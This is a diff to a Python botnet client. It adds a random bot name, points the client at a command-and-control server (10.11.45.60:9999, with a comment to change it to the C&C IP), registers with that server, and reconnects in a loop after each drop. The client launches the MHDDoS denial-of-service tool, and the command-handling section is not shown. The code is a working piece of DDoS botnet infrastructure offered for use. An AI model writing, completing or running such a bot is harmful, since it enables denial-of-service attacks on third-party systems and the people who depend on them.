@@ -1,15 +1,20 @@
+#!/usr/bin/env python3
+
 import sys
 import asyncio
 import time
 import subprocess
 import os
+import uuid
 
 CUR_DIR = os.path.dirname(os.path.realpath(__file__))
-MHDDoS = CUR_DIR + os.sep + 'MHDDoS' + os.sep + 'start.py'
+MHDDoS = os.sep + 'MHDDoS' + os.sep + 'start.py'
 
-async def start_bot(bot_name):
-    reader, writer = await asyncio.open_connection('127.0.0.1', 8888)
-    reg_cmd = f'register {bot_name}}'
+async def start_bot():
+    bot_name = 'bot-' + str(uuid.uuid4())
+    # change IP to cnc server
+    reader, writer = await asyncio.open_connection('10.11.45.60', 9999)
+    reg_cmd = f'register {bot_name}'
     writer.write(reg_cmd.encode())
     await writer.drain()
     print('Connected to C&C Server')
@@ -28,7 +33,7 @@ async def start_bot(bot_name):
 
 def main():
     while True:
-        asyncio.run(start_bot(sys.argv[1]))
+        asyncio.run(start_bot())
         print('bot is disconected, will restart again')
         time.sleep(10)
 
